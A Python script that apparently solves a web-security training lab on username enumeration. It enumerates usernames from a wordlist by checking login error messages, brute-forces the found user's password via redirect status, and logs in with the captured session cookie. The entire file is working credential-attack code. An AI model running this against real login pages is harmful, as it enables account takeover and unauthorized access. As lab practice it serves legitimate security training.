import requests
import urllib3
import re
import time
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Username enumeration via different responses"

SCRIPT_START_TIME = time.time()


def read_list(files_path):
    try:
        return open(files_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "[!] Failed to opent the file " +
              files_path + " through exception")
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME)))
    print(Fore.WHITE + "Elapsed: " + Fore.YELLOW + str(elapsed_time) +
          Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed_time = int((time.time() - SCRIPT_START_TIME))
    print(Fore.WHITE + "[+] Finished in: " + Fore.YELLOW +
          str(elapsed_time) + Fore.WHITE + " seconds")


def login(username, password, url, proxies):
    data = {"username": username, "password": password}
    try:
        return requests.post(f"{url}/login", data, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(
            Fore.RED + f"\n⦗!⦘ Failed to login as {username} through exception")


def try_to_find_valid_username(usernames_list, url, proxies):
    total_users = len(usernames_list)

    for counter, user in enumerate(usernames_list):
        print_progress(counter, total_users, user)

        try_to_login = login(user, "not important", url, proxies)

        if try_to_login.status_code == 200:
            invalid_username = re.findall(
                "Invalid username", try_to_login.text)

            if len(invalid_username) == 0:
                return user
            else:
                continue
        else:
            continue

    print(Fore.RED + "[!] No valid username was found")
    exit(1)


def brute_force_password(valid_user, passwords, url, proxies):
    total_passwords = len(passwords)

    for (counter, password) in enumerate(passwords):
        print_progress(counter, total_passwords, password)

        try_to_login = login(valid_user, password, url, proxies)

        if try_to_login.status_code == 302:
            session = try_to_login.cookies.get("session")
            return (password, session)
        else:
            continue

    print(Fore.RED + "[!] No valid password was found")
    exit(1)


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Read usernames and passwords lists\n2. Try to find a valid username via different error messages\n3. Brute force the password of that valid username\n4. Login with the valid credentials\n""")

    print(Fore.WHITE + "[1] Reading usernames list..")

    usernames_list = read_list("usernames.txt")

    print(Fore.GREEN + "usernames stored")
    print(Fore.WHITE + "[2] Reading password list..")

    password_list = read_list("passwords.txt")

    print(Fore.GREEN + "passwords stored")

    print(Fore.WHITE + "[3] findind valid username")
    valid_user = try_to_find_valid_username(usernames_list, url, proxies)

    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "[4] Brute forcing password.. ")

    (valid_password, valid_session) = brute_force_password(
        valid_user, password_list, url, proxies)

    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "[5] Logging in.. ", end="", flush=True)

    cookies = {"session": valid_session}

    try:
        r = requests.get(f"{url}/my-account", cookies=cookies,
                         allow_redirects=False, verify=False, proxies=proxies)
        res = r.text
        print_finish_message()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
